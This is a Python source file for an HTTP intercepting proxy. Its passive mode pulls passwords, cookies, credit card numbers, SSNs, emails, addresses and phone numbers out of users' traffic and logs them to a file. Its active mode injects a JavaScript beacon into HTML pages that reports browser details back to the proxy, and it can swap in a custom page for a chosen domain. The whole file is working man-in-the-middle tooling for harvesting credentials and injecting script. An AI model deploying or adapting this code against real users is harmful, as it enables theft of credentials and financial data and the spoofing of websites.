"""
proxy.py - HTTP intercepting proxy for traffic inspection and analysis.

Operates in two modes:

  passive  — Logs PII-like data (emails, passwords, cookies, credit cards,
             addresses, phone numbers) extracted from request/response traffic.
             Output: info_1.txt

  active   — Injects a JavaScript beacon into HTML responses to collect
             browser fingerprint data (user agent, screen resolution, language).
             Optionally serves a custom page for a target domain.
             Output: info_2.txt

Usage:
    python proxy.py -m passive <listen_ip> <listen_port>
    python proxy.py -m active  <listen_ip> <listen_port> [target_domain]

Configure your browser or system to use <listen_ip>:<listen_port> as an
HTTP proxy.

Requirements:
    pip install -r requirements.txt   (standard library only)
"""

import re
import os
import sys
import socket
import select
import urllib
import argparse
import threading
from time import sleep
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from http.client import HTTPConnection
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


# ---------------------------------------------------------------------------
# Globals
# ---------------------------------------------------------------------------

active_mode = False
listen_ip = ""
listen_port = 0
target_domain = ""
buffer_size = 8192
_lock = threading.Lock()


# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

def write_log(url: str, entries: list):
    """Thread-safe append to the appropriate log file."""
    log_file = "info_2.txt" if active_mode else "info_1.txt"

    while _lock.locked():
        sleep(0.01)
    _lock.acquire()
    try:
        with open(log_file, "a+") as f:
            f.write(f"\n\n{datetime.now()} -- From: {url}")
            for entry in entries:
                f.write(f"\n{entry}")
    finally:
        _lock.release()


# ---------------------------------------------------------------------------
# Request handler
# ---------------------------------------------------------------------------

class ProxyHandler(BaseHTTPRequestHandler):
    def __init__(self, request, client_address, server):
        super().__init__(request, client_address, server)

    # ------------------------------------------------------------------
    # Main verb handler (GET / POST / PUT / etc.)
    # ------------------------------------------------------------------

    def do_GET(self):
        url_obj = urlparse(self.path)

        if url_obj.scheme not in ("http", ""):
            self.send_error(500, "Only HTTP is supported.")
            return

        # Active mode: serve custom page for target domain
        if active_mode and target_domain == url_obj.netloc:
            self._serve_custom_page()
            return

        # Active mode: receive JS beacon callbacks from injected script
        if active_mode and url_obj.netloc in (f"{listen_ip}:{listen_port}", ""):
            self._handle_beacon_callback(url_obj)
            return

        # Forward the request to the upstream server
        req = self
        req.body = self._read_body(req)
        if active_mode:
            self._patch_header(req, "Accept-Encoding", "None")

        req_path = (
            self.path.replace(url_obj.scheme, "")
            .replace(url_obj.netloc, "")
            .replace("://", "")
        )

        try:
            conn = HTTPConnection(host=url_obj.netloc, timeout=self.timeout)
            conn.request(self.command, req_path, req.body, self.headers)
            try:
                res = conn.getresponse()
                res.body = res.read()
            except Exception:
                self.send_error(503, "Server Unavailable")
                self.close_connection = 1
                return

            if active_mode:
                self._inject_js(res)
            self._patch_header(res, "Content-Length", str(len(res.body)))

            self.wfile.write(
                f"{self.protocol_version} {res.status} {res.reason}\r\n".encode()
            )
            for name, value in res.getheaders():
                if value != "chunked":
                    self.send_header(name, value)
            self.end_headers()
            self.wfile.write(res.body)
            self.wfile.flush()

        except socket.error:
            conn.close()
            self.close_connection = 1
            try:
                self.send_error(504, "Gateway Timeout")
            except Exception:
                pass
            return

        self._extract_info(req, res)

    def do_CONNECT(self):
        """Handle CONNECT tunnelling (used by browsers for push services)."""
        try:
            address = self.path.split(":", 1)
            address[1] = int(address[1]) or 443
        except Exception:
            self.send_error(400, "Invalid Address")
            return

        sock = None
        try:
            sock = socket.create_connection(address, timeout=self.timeout)
            self.send_response(200, "Connection established")
            self.end_headers()
            self._tunnel(sock)
        except Exception:
            self.send_error(502, "Server Unreachable")
        finally:
            if sock:
                sock.close()

    do_HEAD = do_POST = do_PUT = do_DELETE = do_OPTIONS = do_GET

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _tunnel(self, remote):
        remote.setblocking(False)
        self.request.setblocking(False)
        sockets = [self.request, remote]
        while True:
            readable, _, errors = select.select(sockets, [], [])
            if errors:
                self.send_response(500)
                self.end_headers()
                return
            for s in readable:
                data = s.recv(1024)
                if not data:
                    return
                other = remote if s is self.request else self.request
                other.send(data)

    def _read_body(self, req):
        length = int(req.headers.get("Content-Length", 0))
        return self.rfile.read(length) if length else None

    def _patch_header(self, obj, key, value):
        if obj.headers.get(key, None):
            obj.headers.replace_header(key, value)
        else:
            obj.headers.add_header(key, value)

    def _serve_custom_page(self):
        page_file = "custom_page.html"
        if not os.path.isfile(page_file):
            print(f"[!] '{page_file}' not found — falling through to normal flow.")
            return
        with open(page_file, "r") as f:
            body = f.read().encode()
        self.wfile.write(f"{self.protocol_version} 200 OK\r\n".encode())
        self.send_header("Content-Type", "text/html; charset=UTF-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        self.wfile.flush()

    def _handle_beacon_callback(self, url_obj):
        origin = self.headers.get("Origin", listen_ip)
        info = {k: v[0] for k, v in parse_qs(url_obj.query).items()}
        if info:
            write_log(origin, [f"{k}:\t{v}" for k, v in info.items()])
        self.send_response_only(200, "OK")

    def _inject_js(self, res):
        """Inject a JS beacon into HTML responses (active mode)."""
        if res.status != 200 or not res.body:
            return
        content_type = res.getheader("Content-Type", "")
        if "text/html" not in content_type:
            return

        charset = ""
        try:
            charset = re.search(r"charset=(\S+)", content_type).group(1)
        except (AttributeError, TypeError):
            pass

        try:
            text = res.body.decode(charset) if charset else res.body.decode("utf-8")
        except Exception:
            return

        index = text.find("<body>")
        if index == -1:
            return

        beacon = f"""
        <script>
        var ua = navigator.userAgent;
        var res = window.innerWidth + '*' + window.innerHeight;
        var lang = navigator.language;
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "http://{listen_ip}:{listen_port}/?user_agent=" + encodeURI(ua) + "&screen=" + encodeURI(res) + "&lang=" + encodeURI(lang));
        xhr.send();
        </script>
        """
        text = text[: index + 6] + beacon + text[index + 6 :]
        res.headers.add_header(
            "Access-Control-Allow-Origin", f"http://{listen_ip}:{listen_port}/"
        )

        try:
            res.body = text.encode(charset) if charset else text.encode("utf-8")
        except Exception:
            return

    def _extract_info(self, req, res):
        """Passive mode: regex-extract PII-like fields from traffic."""
        if active_mode:
            return

        patterns = {
            "First Name":    (r"(first(?:n|N)ame|f(?:n|N)ame)(?:=|:\s?)(\w+)", 2),
            "Last Name":     (r"(last(?:n|N)ame|l(?:n|N)ame)(?:=|:\s?)(\w+)", 2),
            "User Name":     (r"(user(?:n|N)ame|u(?:n|N)ame)(?:=|:\s?)(\w+)", 2),
            "Email":         (r"(?:e(?:m|M)ail|email_id)(?:=|:\s?)([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)", 1),
            "Password":      (r"(?:password|pass)(?:=|:\s?)([a-zA-Z0-9_@$!%*#?]+)", 1),
            "SSN":           (r"((?!666|000|9\d{2})\d{3}-(?!00)\d{2}-(?!0{4})\d{4})", 1),
            "Credit Card":   (r"((\d{4})[-.\s]?(\d{4})[-.\s]?(\d{4})[-.\s]?(\d{4}))", 1),
            "Street Address":(r"(\d+ (?:[A-Za-z0-9.-]+ ?)+(?:Avenue|Lane|Road|Boulevard|Drive|Street|Ave|Dr|Rd|Blvd|Ln|St)\.?)", 1),
            "City":          (r"city(?:=|:\s?)(\w+)", 1),
            "State":         (r"state(?:=|:\s?)(\w+)", 1),
            "Phone (US)":    (r"((?:\(\d{3}\)\s?|\d{3}-)\d{3}-\d{4})", 1),
        }

        found = []
        found += self._regex_search(patterns, req.path)

        cookie = req.headers.get("Cookie")
        if cookie:
            found.append(f"Request-Cookie:\t{cookie}")
        set_cookie = res.getheader("Set-Cookie")
        if set_cookie:
            found.append(f"Response-Cookie:\t{set_cookie}")

        if req.body:
            found += self._regex_search(patterns, req.body)

        content_type = res.getheader("Content-Type", "")
        if res.body and "image" not in content_type:
            found += self._regex_search(patterns, res.body)

        if found:
            write_log(req.path, found)

    def _regex_search(self, patterns: dict, data) -> list:
        if isinstance(data, bytes):
            data = data.decode("iso-8859-1")
        data = urllib.parse.unquote_plus(data)
        results = []
        for label, (pattern, group) in patterns.items():
            match = re.search(pattern, data, re.MULTILINE)
            if match:
                results.append(f"{label}:\t{match.group(group)}")
        return results


# ---------------------------------------------------------------------------
# Server
# ---------------------------------------------------------------------------

class ProxyServer(ThreadingHTTPServer):
    pass


def start_server():
    addr = (listen_ip, listen_port)
    with ProxyServer(addr, ProxyHandler) as httpd:
        print(f"[*] Proxy listening on {listen_ip}:{listen_port}")
        print(f"[*] Mode: {'active' if active_mode else 'passive'}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Shutting down.")
            sys.exit(0)


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------

def validate_ip(addr: str) -> bool:
    parts = addr.split(".")
    if len(parts) != 4:
        return False
    return all(0 <= int(p) <= 255 for p in parts if p.isdigit())


def parse_args():
    global listen_ip, listen_port, active_mode, target_domain

    parser = argparse.ArgumentParser(
        description="HTTP intercepting proxy — passive traffic logging or active JS injection.",
        conflict_handler="resolve",
    )
    parser.add_argument("-m", dest="mode", choices={"active", "passive"}, required=True,
                        help="Operation mode: passive (log traffic) or active (inject JS)")
    parser.add_argument("listening_ip", help="IP address to bind (e.g. 127.0.0.1)")
    parser.add_argument("listening_port", type=int, help="Port to bind (1025–65535)")
    parser.add_argument("domain", nargs="?", default="",
                        help="Target domain for custom page injection (active mode only)")
    args = parser.parse_args()

    if not validate_ip(args.listening_ip):
        print(f"[!] Invalid IP: {args.listening_ip}")
        sys.exit(1)
    if not (1025 <= args.listening_port <= 65535):
        print(f"[!] Port must be in range 1025–65535.")
        sys.exit(1)
    if args.mode == "active" and not args.domain:
        print("[!] Active mode requires a target domain.")
        sys.exit(1)

    listen_ip = args.listening_ip
    listen_port = args.listening_port
    active_mode = args.mode == "active"
    target_domain = args.domain


def main():
    parse_args()
    start_server()


if __name__ == "__main__":
    main()
